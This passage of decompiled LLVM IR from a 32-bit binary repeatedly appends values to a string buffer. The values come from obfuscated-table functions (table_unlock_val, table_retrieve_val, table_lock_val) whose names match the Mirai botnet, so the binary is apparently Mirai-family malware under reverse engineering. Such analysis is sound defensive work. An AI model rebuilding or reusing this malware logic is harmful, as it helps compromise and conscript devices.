  %v2_8048fdb = load i32, i32* %v1_8048fdb, align 4
  store i32 %v2_8048fdb, i32* @ebx, align 4
  %v1_8048fdc = add i32 %v0_8048fdb, 10388
  store i32 %v1_8048fdc, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048fdc, i32* %v1_8048fdb, align 4
  %v2_8048fe4 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe9 = load i32, i32* @esp, align 4
  %v1_8048fe9 = inttoptr i32 %v0_8048fe9 to i32*
  %v3_8048fe9 = add i32 %v0_8048fe9, 4
  %v0_8048fea = load i32, i32* @edi, align 4
  %v1_8048fea = add i32 %v0_8048fea, 532
  store i32 %v1_8048fea, i32* %edx.global-to-local, align 4
  %v1_8048ff0 = inttoptr i32 %v3_8048fe9 to i32*
  %v2_8048ff0 = load i32, i32* %v1_8048ff0, align 4
  store i32 %v2_8048ff0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048fea, i32* %v1_8048ff0, align 4
  %v1_8048ff2 = add i32 %v0_8048fe9, 10388
  store i32 %v1_8048ff2, i32* %edx.global-to-local, align 4
  %v2_8048ff9 = add i32 %v1_8048ff2, %v2_8048fe4
  store i32 %v2_8048ff9, i32* @eax, align 4
  store i32 %v2_8048ff9, i32* %v1_8048fe9, align 4
  %v3_8048ffd = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8048ffd, i32* %eax.global-to-local, align 4
  %v0_8049002 = load i32, i32* @esp, align 4
  %v1_8049002 = inttoptr i32 %v0_8049002 to i32*
  %v2_8049002 = load i32, i32* %v1_8049002, align 4
  store i32 %v2_8049002, i32* @ebx, align 4
  %v1_8049003 = add i32 %v0_8049002, 10388
  store i32 %v1_8049003, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049003, i32* %v1_8049002, align 4
  %v2_804900b = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804900b, i32* %eax.global-to-local, align 4
  %v0_8049010 = load i32, i32* @esp, align 4
  %v1_8049010 = inttoptr i32 %v0_8049010 to i32*
  %v2_8049010 = load i32, i32* %v1_8049010, align 4
  store i32 %v2_8049010, i32* %edx.global-to-local, align 4
  %v3_8049010 = add i32 %v0_8049010, 4
  %v1_8049011 = inttoptr i32 %v3_8049010 to i32*
  %v2_8049011 = load i32, i32* %v1_8049011, align 4
  store i32 %v2_8049011, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_805582f.15 to i32), i32* %v1_8049011, align 4
  %v1_8049017 = add i32 %v0_8049010, 10388
  store i32 %v1_8049017, i32* %edx.global-to-local, align 4
  %v2_804901e = add i32 %v1_8049017, %v2_804900b
  store i32 %v2_804901e, i32* @eax, align 4
  store i32 %v2_804901e, i32* %v1_8049010, align 4
  %v3_8049022 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v1_8049027 = inttoptr i32 %v0_8049027 to i32*
  %v2_8049027 = load i32, i32* %v1_8049027, align 4
  store i32 %v2_8049027, i32* @ebx, align 4
  %v1_8049028 = add i32 %v0_8049027, 10388
  store i32 %v1_8049028, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049028, i32* %v1_8049027, align 4
  %v2_8049030 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049030, i32* %eax.global-to-local, align 4
  %v0_8049035 = load i32, i32* @esp, align 4
  %v1_8049035 = inttoptr i32 %v0_8049035 to i32*
  %v3_8049035 = add i32 %v0_8049035, 4
  %v0_8049036 = load i32, i32* @edi, align 4
  %v1_8049036 = add i32 %v0_8049036, 20
  store i32 %v1_8049036, i32* %edx.global-to-local, align 4
  %v1_8049039 = inttoptr i32 %v3_8049035 to i32*
  %v2_8049039 = load i32, i32* %v1_8049039, align 4
  store i32 %v2_8049039, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049036, i32* %v1_8049039, align 4
  %v1_804903b = add i32 %v0_8049035, 10388
  store i32 %v1_804903b, i32* %edx.global-to-local, align 4
  %v2_8049042 = add i32 %v1_804903b, %v2_8049030
  store i32 %v2_8049042, i32* @eax, align 4
  store i32 %v2_8049042, i32* %v1_8049035, align 4
  %v3_8049046 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049046, i32* %eax.global-to-local, align 4
  %v0_804904b = load i32, i32* @esp, align 4
  %v1_804904b = inttoptr i32 %v0_804904b to i32*
  %v2_804904b = load i32, i32* %v1_804904b, align 4
  store i32 %v2_804904b, i32* @ebx, align 4
  %v1_804904c = add i32 %v0_804904b, 10388
  store i32 %v1_804904c, i32* %ecx.global-to-local, align 4
  store i32 %v1_804904c, i32* %v1_804904b, align 4
  %v2_8049054 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049054, i32* %eax.global-to-local, align 4
  %v0_8049059 = load i32, i32* @esp, align 4
  %v1_8049059 = inttoptr i32 %v0_8049059 to i32*
  %v2_8049059 = load i32, i32* %v1_8049059, align 4
  store i32 %v2_8049059, i32* %edx.global-to-local, align 4
  %v3_8049059 = add i32 %v0_8049059, 4
  %v1_804905a = inttoptr i32 %v3_8049059 to i32*
  %v2_804905a = load i32, i32* %v1_804905a, align 4
  store i32 %v2_804905a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8055847.16 to i32), i32* %v1_804905a, align 4
  %v1_8049060 = add i32 %v0_8049059, 10388
  store i32 %v1_8049060, i32* %edx.global-to-local, align 4
  %v2_8049067 = add i32 %v1_8049060, %v2_8049054
  store i32 %v2_8049067, i32* @eax, align 4
  store i32 %v2_8049067, i32* %v1_8049059, align 4
  %v3_804906b = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804906b, i32* %eax.global-to-local, align 4
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = inttoptr i32 %v0_8049070 to i32*
  %v2_8049070 = load i32, i32* %v1_8049070, align 4
  store i32 %v2_8049070, i32* @ebx, align 4
  %v1_8049071 = add i32 %v0_8049070, 10388
  store i32 %v1_8049071, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049071, i32* %v1_8049070, align 4
  %v2_8049079 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049079, i32* %eax.global-to-local, align 4
  %v0_804907e = load i32, i32* @esp, align 4
  %v1_804907e = inttoptr i32 %v0_804907e to i32*
  %v3_804907e = add i32 %v0_804907e, 4
  %v0_804907f = load i32, i32* @edi, align 4
  %v1_804907f = add i32 %v0_804907f, 789
  store i32 %v1_804907f, i32* %edx.global-to-local, align 4
  %v1_8049085 = inttoptr i32 %v3_804907e to i32*
  %v2_8049085 = load i32, i32* %v1_8049085, align 4
  store i32 %v2_8049085, i32* %ecx.global-to-local, align 4
  store i32 %v1_804907f, i32* %v1_8049085, align 4
  %v1_8049087 = add i32 %v0_804907e, 10388
  store i32 %v1_8049087, i32* %edx.global-to-local, align 4
  %v2_804908e = add i32 %v1_8049087, %v2_8049079
  store i32 %v2_804908e, i32* @eax, align 4
  store i32 %v2_804908e, i32* %v1_804907e, align 4
  %v3_8049092 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049092, i32* %eax.global-to-local, align 4
  %v0_8049097 = load i32, i32* @esp, align 4
  %v1_8049097 = inttoptr i32 %v0_8049097 to i32*
  %v2_8049097 = load i32, i32* %v1_8049097, align 4
  store i32 %v2_8049097, i32* %eax.global-to-local, align 4
  %v1_8049098 = add i32 %v0_8049097, 10388
  store i32 %v1_8049098, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049098, i32* %v1_8049097, align 4
  %v2_80490a0 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80490a0, i32* %eax.global-to-local, align 4
  %v0_80490a5 = load i32, i32* @esp, align 4
  %v1_80490a5 = inttoptr i32 %v0_80490a5 to i32*
  %v2_80490a5 = load i32, i32* %v1_80490a5, align 4
  store i32 %v2_80490a5, i32* %ecx.global-to-local, align 4
  %v3_80490a5 = add i32 %v0_80490a5, 4
  %v1_80490a6 = inttoptr i32 %v3_80490a5 to i32*
  %v2_80490a6 = load i32, i32* %v1_80490a6, align 4
  store i32 %v2_80490a6, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_80490a6, align 4
  %v1_80490ac = add i32 %v0_80490a5, 10388
  store i32 %v1_80490ac, i32* %edx.global-to-local, align 4
  %v2_80490b3 = add i32 %v1_80490ac, %v2_80490a0
  store i32 %v2_80490b3, i32* @eax, align 4
  store i32 %v2_80490b3, i32* %v1_80490a5, align 4
  %v3_80490b7 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80490b7, i32* %eax.global-to-local, align 4
  %v0_80490bc = load i32, i32* @esp, align 4
  %v1_80490bc = inttoptr i32 %v0_80490bc to i32*
  store i32 39, i32* %v1_80490bc, align 4
  %v2_80490c3 = call i32 @table_unlock_val(i8 %v1_80490c3)
  store i32 %v2_80490c3, i32* %eax.global-to-local, align 4
  %v0_80490c8 = load i32, i32* @esp, align 4
  %v1_80490c8 = inttoptr i32 %v0_80490c8 to i32*
  %v2_80490c8 = load i32, i32* %v1_80490c8, align 4
  store i32 %v2_80490c8, i32* %eax.global-to-local, align 4
  %v3_80490c8 = add i32 %v0_80490c8, 4
  %v1_80490c9 = inttoptr i32 %v3_80490c8 to i32*
  %v2_80490c9 = load i32, i32* %v1_80490c9, align 4
  store i32 %v2_80490c9, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80490c9, align 4
  store i32 39, i32* %v1_80490c8, align 4
  %v3_80490ce = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_80490ce, i32* %eax.global-to-local, align 4
  store i32 %v3_80490ce, i32* @ebx, align 4
  %v0_80490d5 = load i32, i32* @esp, align 4
  %v1_80490d5 = inttoptr i32 %v0_80490d5 to i32*
  %v2_80490d5 = load i32, i32* %v1_80490d5, align 4
  store i32 %v2_80490d5, i32* %eax.global-to-local, align 4
  %v1_80490d6 = add i32 %v0_80490d5, 10388
  store i32 %v1_80490d6, i32* %ecx.global-to-local, align 4
  store i32 %v1_80490d6, i32* %v1_80490d5, align 4
  %v2_80490de = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80490de, i32* %eax.global-to-local, align 4
  %v0_80490e3 = load i32, i32* @esp, align 4
  %v1_80490e3 = inttoptr i32 %v0_80490e3 to i32*
  %v2_80490e3 = load i32, i32* %v1_80490e3, align 4
  store i32 %v2_80490e3, i32* %edx.global-to-local, align 4
  %v3_80490e3 = add i32 %v0_80490e3, 4
  %v1_80490e4 = inttoptr i32 %v3_80490e3 to i32*
  %v2_80490e4 = load i32, i32* %v1_80490e4, align 4
  store i32 %v2_80490e4, i32* %ecx.global-to-local, align 4
  %v0_80490e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80490e5, i32* %v1_80490e4, align 4
  %v1_80490e6 = add i32 %v0_80490e3, 10388
  store i32 %v1_80490e6, i32* %edx.global-to-local, align 4
  %v2_80490ed = add i32 %v1_80490e6, %v2_80490de
  store i32 %v2_80490ed, i32* @eax, align 4
  store i32 %v2_80490ed, i32* %v1_80490e3, align 4
  %v3_80490f1 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80490f1, i32* %eax.global-to-local, align 4
  %v0_80490f6 = load i32, i32* @esp, align 4
  %v1_80490f6 = inttoptr i32 %v0_80490f6 to i32*
  store i32 39, i32* %v1_80490f6, align 4
  %v2_80490fd = call i32 @table_lock_val(i8 %v1_80490c3)
  store i32 %v2_80490fd, i32* %eax.global-to-local, align 4
  %v0_8049102 = load i32, i32* @esp, align 4
  %v1_8049102 = inttoptr i32 %v0_8049102 to i32*
  %v2_8049102 = load i32, i32* %v1_8049102, align 4
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v1_8049103 = add i32 %v0_8049102, 10388
  store i32 %v1_8049103, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049103, i32* %v1_8049102, align 4
  %v2_804910b = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804910b, i32* %eax.global-to-local, align 4
  %v0_8049110 = load i32, i32* @esp, align 4
  %v1_8049110 = inttoptr i32 %v0_8049110 to i32*
  %v2_8049110 = load i32, i32* %v1_8049110, align 4
  store i32 %v2_8049110, i32* %ecx.global-to-local, align 4
  %v3_8049110 = add i32 %v0_8049110, 4
  %v1_8049111 = inttoptr i32 %v3_8049110 to i32*
  %v2_8049111 = load i32, i32* %v1_8049111, align 4
  store i32 %v2_8049111, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_8049111, align 4
  %v1_8049117 = add i32 %v0_8049110, 10388
  store i32 %v1_8049117, i32* %edx.global-to-local, align 4
  %v2_804911e = add i32 %v1_8049117, %v2_804910b
  store i32 %v2_804911e, i32* @eax, align 4
  store i32 %v2_804911e, i32* %v1_8049110, align 4
  %v3_8049122 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049122, i32* %eax.global-to-local, align 4
  %v0_8049127 = load i32, i32* @esp, align 4
  %v1_8049127 = inttoptr i32 %v0_8049127 to i32*
  store i32 40, i32* %v1_8049127, align 4
  %v2_804912e = call i32 @table_unlock_val(i8 %v1_80490c3)
  store i32 %v2_804912e, i32* %eax.global-to-local, align 4
  %v0_8049133 = load i32, i32* @esp, align 4
  %v1_8049133 = inttoptr i32 %v0_8049133 to i32*
  %v2_8049133 = load i32, i32* %v1_8049133, align 4
  store i32 %v2_8049133, i32* %eax.global-to-local, align 4
  %v3_8049133 = add i32 %v0_8049133, 4
  %v1_8049134 = inttoptr i32 %v3_8049133 to i32*
  %v2_8049134 = load i32, i32* %v1_8049134, align 4
  store i32 %v2_8049134, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8049134, align 4
  store i32 40, i32* %v1_8049133, align 4
  %v3_8049139 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049139, i32* %eax.global-to-local, align 4
  store i32 %v3_8049139, i32* @ebx, align 4
  %v0_8049140 = load i32, i32* @esp, align 4
  %v1_8049140 = inttoptr i32 %v0_8049140 to i32*
  %v2_8049140 = load i32, i32* %v1_8049140, align 4
  store i32 %v2_8049140, i32* %eax.global-to-local, align 4
  %v1_8049141 = add i32 %v0_8049140, 10388
  store i32 %v1_8049141, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049141, i32* %v1_8049140, align 4
  %v2_8049149 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049149, i32* %eax.global-to-local, align 4
  %v0_804914e = load i32, i32* @esp, align 4
  %v1_804914e = inttoptr i32 %v0_804914e to i32*
  %v2_804914e = load i32, i32* %v1_804914e, align 4
  store i32 %v2_804914e, i32* %edx.global-to-local, align 4
  %v3_804914e = add i32 %v0_804914e, 4
  %v1_804914f = inttoptr i32 %v3_804914e to i32*
  %v2_804914f = load i32, i32* %v1_804914f, align 4
  store i32 %v2_804914f, i32* %ecx.global-to-local, align 4
  %v0_8049150 = load i32, i32* @ebx, align 4
  store i32 %v0_8049150, i32* %v1_804914f, align 4
  %v1_8049151 = add i32 %v0_804914e, 10388
  store i32 %v1_8049151, i32* %edx.global-to-local, align 4
  %v2_8049158 = add i32 %v1_8049151, %v2_8049149
  store i32 %v2_8049158, i32* @eax, align 4
  store i32 %v2_8049158, i32* %v1_804914e, align 4
  %v3_804915c = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804915c, i32* %eax.global-to-local, align 4
  %v0_8049161 = load i32, i32* @esp, align 4
  %v1_8049161 = inttoptr i32 %v0_8049161 to i32*
  store i32 40, i32* %v1_8049161, align 4
  %v2_8049168 = call i32 @table_lock_val(i8 %v1_80490c3)
  store i32 %v2_8049168, i32* %eax.global-to-local, align 4
  %v0_804916d = load i32, i32* @esp, align 4
  %v1_804916d = inttoptr i32 %v0_804916d to i32*
  %v2_804916d = load i32, i32* %v1_804916d, align 4
  store i32 %v2_804916d, i32* %eax.global-to-local, align 4
  %v1_804916e = add i32 %v0_804916d, 10388
  store i32 %v1_804916e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804916e, i32* %v1_804916d, align 4
  %v2_8049176 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049176, i32* %eax.global-to-local, align 4
  %v0_804917b = load i32, i32* @esp, align 4
  %v1_804917b = inttoptr i32 %v0_804917b to i32*
  %v2_804917b = load i32, i32* %v1_804917b, align 4
  store i32 %v2_804917b, i32* %ecx.global-to-local, align 4
  %v3_804917b = add i32 %v0_804917b, 4
  %v1_804917c = inttoptr i32 %v3_804917b to i32*
  %v2_804917c = load i32, i32* %v1_804917c, align 4
  store i32 %v2_804917c, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_804917c, align 4
  %v1_8049182 = add i32 %v0_804917b, 10388
  store i32 %v1_8049182, i32* %edx.global-to-local, align 4
  %v2_8049189 = add i32 %v1_8049182, %v2_8049176
  store i32 %v2_8049189, i32* @eax, align 4
  store i32 %v2_8049189, i32* %v1_804917b, align 4
  %v3_804918d = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804918d, i32* %eax.global-to-local, align 4
  %v0_8049192 = load i32, i32* @esp, align 4
  %v1_8049192 = inttoptr i32 %v0_8049192 to i32*
  store i32 41, i32* %v1_8049192, align 4
  %v2_8049199 = call i32 @table_unlock_val(i8 %v1_80490c3)
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919e = load i32, i32* @esp, align 4
  %v1_804919e = inttoptr i32 %v0_804919e to i32*
  %v2_804919e = load i32, i32* %v1_804919e, align 4
  store i32 %v2_804919e, i32* %eax.global-to-local, align 4
  %v3_804919e = add i32 %v0_804919e, 4
  %v1_804919f = inttoptr i32 %v3_804919e to i32*
  %v2_804919f = load i32, i32* %v1_804919f, align 4
  store i32 %v2_804919f, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804919f, align 4
  store i32 41, i32* %v1_804919e, align 4
  %v3_80491a4 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_80491a4, i32* %eax.global-to-local, align 4
  store i32 %v3_80491a4, i32* @ebx, align 4
  %v0_80491ab = load i32, i32* @esp, align 4
  %v1_80491ab = inttoptr i32 %v0_80491ab to i32*
  %v2_80491ab = load i32, i32* %v1_80491ab, align 4
  store i32 %v2_80491ab, i32* %eax.global-to-local, align 4
  %v1_80491ac = add i32 %v0_80491ab, 10388
  store i32 %v1_80491ac, i32* %ecx.global-to-local, align 4
  store i32 %v1_80491ac, i32* %v1_80491ab, align 4
  %v2_80491b4 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80491b4, i32* %eax.global-to-local, align 4
  %v0_80491b9 = load i32, i32* @esp, align 4
  %v1_80491b9 = inttoptr i32 %v0_80491b9 to i32*
  %v2_80491b9 = load i32, i32* %v1_80491b9, align 4
  store i32 %v2_80491b9, i32* %edx.global-to-local, align 4
  %v3_80491b9 = add i32 %v0_80491b9, 4
  %v1_80491ba = inttoptr i32 %v3_80491b9 to i32*
  %v2_80491ba = load i32, i32* %v1_80491ba, align 4
  store i32 %v2_80491ba, i32* %ecx.global-to-local, align 4
  %v0_80491bb = load i32, i32* @ebx, align 4
  store i32 %v0_80491bb, i32* %v1_80491ba, align 4
  %v1_80491bc = add i32 %v0_80491b9, 10388
  store i32 %v1_80491bc, i32* %edx.global-to-local, align 4
  %v2_80491c3 = add i32 %v1_80491bc, %v2_80491b4
  store i32 %v2_80491c3, i32* @eax, align 4
  store i32 %v2_80491c3, i32* %v1_80491b9, align 4
  %v3_80491c7 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80491c7, i32* %eax.global-to-local, align 4
  %v0_80491cc = load i32, i32* @esp, align 4
  %v1_80491cc = inttoptr i32 %v0_80491cc to i32*
  store i32 41, i32* %v1_80491cc, align 4
  %v2_80491d3 = call i32 @table_lock_val(i8 %v1_80490c3)
  store i32 %v2_80491d3, i32* %eax.global-to-local, align 4
  %v0_80491d8 = load i32, i32* @esp, align 4
  %v1_80491d8 = inttoptr i32 %v0_80491d8 to i32*
  %v1_80491d9 = add i32 %v0_80491d8, 10388
  store i32 %v1_80491d9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80491d9, i32* %v1_80491d8, align 4
  %v2_80491e1 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80491e1, i32* %eax.global-to-local, align 4
  %v0_80491e6 = load i32, i32* @esp, align 4
  %v1_80491e6 = inttoptr i32 %v0_80491e6 to i32*
  %v2_80491e6 = load i32, i32* %v1_80491e6, align 4
  store i32 %v2_80491e6, i32* @ebx, align 4
  %v3_80491e6 = add i32 %v0_80491e6, 4
  %v1_80491e7 = inttoptr i32 %v3_80491e6 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_80491e7, align 4
  %v1_80491ed = add i32 %v0_80491e6, 10388
  store i32 %v1_80491ed, i32* %edx.global-to-local, align 4
  %v2_80491f4 = add i32 %v1_80491ed, %v2_80491e1
  store i32 %v2_80491f4, i32* @eax, align 4
  store i32 %v2_80491f4, i32* %v1_80491e6, align 4
  %v3_80491f8 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80491f8, i32* %eax.global-to-local, align 4
  %v0_80491fd = load i32, i32* @esp, align 4
  %v1_80491fd = add i32 %v0_80491fd, 16
  %v1_8049200 = add i32 %v0_80491fd, 88
  %v2_8049200 = inttoptr i32 %v1_8049200 to i32*
  %v3_8049200 = load i32, i32* %v2_8049200, align 4
  store i32 %v3_8049200, i32* %ecx.global-to-local, align 4
  %v1_8049204 = icmp eq i32 %v3_8049200, 0
  store i1 %v1_8049204, i1* %zf.global-to-local, align 1
  br i1 %v1_8049204, label %dec_label_pc_8049320, label %dec_label_pc_804920c

dec_label_pc_804920c:                             ; preds = %dec_label_pc_8048f42
  %v9_804920c = icmp eq i32 %v0_80491fd, -4
  store i1 %v9_804920c, i1* %zf.global-to-local, align 1
  %v2_804920f = inttoptr i32 %v0_80491fd to i32*
  store i32 42, i32* %v2_804920f, align 4
  %v2_8049211 = call i32 @table_unlock_val(i8 %v1_80490c3)
  store i32 %v2_8049211, i32* %eax.global-to-local, align 4
  %v0_8049216 = load i32, i32* @esp, align 4
  %v1_8049216 = inttoptr i32 %v0_8049216 to i32*
  %v2_8049216 = load i32, i32* %v1_8049216, align 4
  store i32 %v2_8049216, i32* %eax.global-to-local, align 4
  %v3_8049216 = add i32 %v0_8049216, 4
  %v1_8049217 = inttoptr i32 %v3_8049216 to i32*
  %v2_8049217 = load i32, i32* %v1_8049217, align 4
  store i32 %v2_8049217, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8049217, align 4
  store i32 42, i32* %v1_8049216, align 4
  %v3_804921c = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_804921c, i32* %eax.global-to-local, align 4
  store i32 %v3_804921c, i32* @ebx, align 4
  %v0_8049223 = load i32, i32* @esp, align 4
  %v1_8049223 = inttoptr i32 %v0_8049223 to i32*
  %v2_8049223 = load i32, i32* %v1_8049223, align 4
  store i32 %v2_8049223, i32* %eax.global-to-local, align 4
  %v1_8049224 = add i32 %v0_8049223, 10388
  store i32 %v1_8049224, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049224, i32* %v1_8049223, align 4
  %v2_804922c = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804922c, i32* %eax.global-to-local, align 4
  %v0_8049231 = load i32, i32* @esp, align 4
  %v1_8049231 = inttoptr i32 %v0_8049231 to i32*
  %v2_8049231 = load i32, i32* %v1_8049231, align 4
  store i32 %v2_8049231, i32* %edx.global-to-local, align 4
  %v3_8049231 = add i32 %v0_8049231, 4
  %v1_8049232 = inttoptr i32 %v3_8049231 to i32*
  %v2_8049232 = load i32, i32* %v1_8049232, align 4
  store i32 %v2_8049232, i32* %ecx.global-to-local, align 4
  %v0_8049233 = load i32, i32* @ebx, align 4
  store i32 %v0_8049233, i32* %v1_8049232, align 4
  %v1_8049234 = add i32 %v0_8049231, 10388
  store i32 %v1_8049234, i32* %edx.global-to-local, align 4
  %v2_804923b = add i32 %v1_8049234, %v2_804922c
  store i32 %v2_804923b, i32* @eax, align 4
  store i32 %v2_804923b, i32* %v1_8049231, align 4
  %v3_804923f = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804923f, i32* %eax.global-to-local, align 4
  %v0_8049244 = load i32, i32* @esp, align 4
  %v1_8049244 = inttoptr i32 %v0_8049244 to i32*
  store i32 42, i32* %v1_8049244, align 4
  %v2_804924b = call i32 @table_lock_val(i8 %v1_80490c3)
  store i32 %v2_804924b, i32* %eax.global-to-local, align 4
  %v0_8049250 = load i32, i32* @esp, align 4
  %v1_8049250 = inttoptr i32 %v0_8049250 to i32*
  %v2_8049250 = load i32, i32* %v1_8049250, align 4
  store i32 %v2_8049250, i32* %eax.global-to-local, align 4
  %v1_8049251 = add i32 %v0_8049250, 10388
  store i32 %v1_8049251, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049251, i32* %v1_8049250, align 4
  %v2_8049259 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049259, i32* %eax.global-to-local, align 4
  %v0_804925e = load i32, i32* @esp, align 4
  %v1_804925e = inttoptr i32 %v0_804925e to i32*
  %v2_804925e = load i32, i32* %v1_804925e, align 4
  store i32 %v2_804925e, i32* %ecx.global-to-local, align 4
  %v3_804925e = add i32 %v0_804925e, 4
  %v1_804925f = inttoptr i32 %v3_804925e to i32*
  %v2_804925f = load i32, i32* %v1_804925f, align 4
  store i32 %v2_804925f, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_804925f, align 4
  %v1_8049265 = add i32 %v0_804925e, 10388
  store i32 %v1_8049265, i32* %edx.global-to-local, align 4
  %v2_804926c = add i32 %v1_8049265, %v2_8049259
  store i32 %v2_804926c, i32* @eax, align 4
  store i32 %v2_804926c, i32* %v1_804925e, align 4
  %v3_8049270 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049270, i32* %eax.global-to-local, align 4
  %v0_8049275 = load i32, i32* @esp, align 4
  %v1_8049275 = inttoptr i32 %v0_8049275 to i32*
  %v2_8049275 = load i32, i32* %v1_8049275, align 4
  store i32 %v2_8049275, i32* %eax.global-to-local, align 4
  %v3_8049275 = add i32 %v0_8049275, 4
  %v1_8049276 = inttoptr i32 %v3_8049275 to i32*
  %v2_8049276 = load i32, i32* %v1_8049276, align 4
  store i32 %v2_8049276, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8049276, align 4
  store i32 47, i32* %v1_8049275, align 4
  %v3_804927b = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  store i32 %v3_804927b, i32* @ebx, align 4
  %v0_8049282 = load i32, i32* @esp, align 4
  %v1_8049282 = inttoptr i32 %v0_8049282 to i32*
  %v2_8049282 = load i32, i32* %v1_8049282, align 4
  store i32 %v2_8049282, i32* %eax.global-to-local, align 4
  %v1_8049283 = add i32 %v0_8049282, 10388
  store i32 %v1_8049283, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049283, i32* %v1_8049282, align 4
  %v2_804928b = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804928b, i32* %eax.global-to-local, align 4
  %v0_8049290 = load i32, i32* @esp, align 4
  %v1_8049290 = inttoptr i32 %v0_8049290 to i32*
  %v2_8049290 = load i32, i32* %v1_8049290, align 4
  store i32 %v2_8049290, i32* %edx.global-to-local, align 4
  %v3_8049290 = add i32 %v0_8049290, 4
  %v1_8049291 = inttoptr i32 %v3_8049290 to i32*
  %v2_8049291 = load i32, i32* %v1_8049291, align 4
  store i32 %v2_8049291, i32* %ecx.global-to-local, align 4
  %v0_8049292 = load i32, i32* @ebx, align 4
  store i32 %v0_8049292, i32* %v1_8049291, align 4
  %v1_8049293 = add i32 %v0_8049290, 10388
  store i32 %v1_8049293, i32* %edx.global-to-local, align 4
  %v2_804929a = add i32 %v1_8049293, %v2_804928b
  store i32 %v2_804929a, i32* @eax, align 4
  store i32 %v2_804929a, i32* %v1_8049290, align 4
  %v3_804929e = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804929e, i32* %eax.global-to-local, align 4
  %v0_80492a3 = load i32, i32* @esp, align 4
  %v1_80492a3 = inttoptr i32 %v0_80492a3 to i32*
  %v2_80492a3 = load i32, i32* %v1_80492a3, align 4
  store i32 %v2_80492a3, i32* @ebx, align 4
  %v1_80492a4 = add i32 %v0_80492a3, 10388
  store i32 %v1_80492a4, i32* %ecx.global-to-local, align 4
  store i32 %v1_80492a4, i32* %v1_80492a3, align 4
